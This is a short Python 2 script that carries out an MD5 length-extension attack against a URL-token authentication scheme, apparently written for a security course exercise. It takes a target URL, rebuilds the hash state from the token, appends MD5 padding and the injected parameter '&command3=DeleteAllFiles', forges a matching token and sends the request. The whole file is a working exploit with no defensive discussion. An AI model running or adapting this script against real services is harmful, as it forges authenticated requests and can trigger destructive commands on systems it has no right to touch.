from pymd5 import md5, padding
import httplib, urlparse, sys, urllib
url = sys.argv[1]
attackstr = "&command3=DeleteAllFiles"

#Extract Token
parsedURL = urlparse.urlsplit(url)
queries = parsedURL.query.split("&")
prefix = parsedURL.scheme + "://" + parsedURL.netloc + parsedURL.path
mlength = 8 + len("&".join(queries[1:]))
token = (queries[0])[6:]

#Update Token
padded_message_length = (mlength + len(padding(mlength * 8))) * 8
h = md5(state = token.decode("hex"), count = padded_message_length)
h.update(attackstr)

#Replace Token, add attackstr to URL
queries[0] = (queries[0])[0:6] + h.hexdigest()
newQueries = "&".join(queries)
url = prefix + "?" + newQueries + urllib.quote(padding (mlength * 8)) + attackstr

parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()